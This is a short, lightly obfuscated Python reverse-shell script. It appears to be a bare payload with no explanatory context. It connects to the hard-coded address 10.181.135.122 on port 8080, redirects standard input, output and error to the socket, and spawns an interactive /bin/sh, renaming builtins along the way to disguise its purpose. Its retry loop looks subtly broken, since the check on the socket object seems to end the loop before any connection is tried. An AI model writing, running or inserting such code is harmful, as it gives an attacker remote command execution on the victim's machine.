from __future__ import print_function
s=False
r=range
W=int
N=True
b=Exception
import socket
C=socket.socket
import time
P=time.sleep
import os
O=os.dup2
import subprocess
m=subprocess.call
IP="10.181.135.122"
j=8080
s=C()
V=s
for i in r(10):
 if V:break
 try:
  s.connect((IP,W(j)))
  V=N
  O(s.fileno(),0)
  O(s.fileno(),1)
  O(s.fileno(),2)
  m(["/bin/sh","-i"])
 except b as E:
  P(1)
